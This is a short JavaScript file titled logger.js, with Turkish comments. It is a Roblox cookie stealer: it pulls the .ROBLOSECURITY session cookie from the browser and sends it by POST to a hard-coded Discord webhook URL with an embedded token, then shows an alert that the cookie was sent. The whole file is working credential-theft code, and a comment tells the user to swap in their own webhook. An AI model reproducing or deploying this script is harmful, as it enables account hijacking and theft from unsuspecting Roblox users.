// logger.js - Sadece senin webhook'una gönderir
(function(){
    var c = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
    if (!c) return alert('Cookie bulunamadı!');

    var webhook = 'https://discord.com/api/webhooks/1433138730042134631/WSPjVOpdXfRHX3B9HUVPU4RYbCDMapNAJeizsXHp-Zh_XaZztrbI5H9gMFG7NgDlh-5P'; // <-- BURAYI DEĞİŞTİR

    fetch(webhook, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            embeds: [{
                title: 'Yeni Cookie Loglandı!',
                color: 16711680,
                fields: [
                    { name: 'Cookie', value: '```' + c[1].substring(0,100) + '...' + '```' },
                    { name: 'Kullanıcı', value: '||@everyone||' } // İstersen kaldır
                ],
                timestamp: new Date().toISOString()
            }]
        })
    }).then(() => {
        alert('Cookie gönderildi!');
    }).catch(() => {
        alert('Gönderim hatası!');
    });
})();
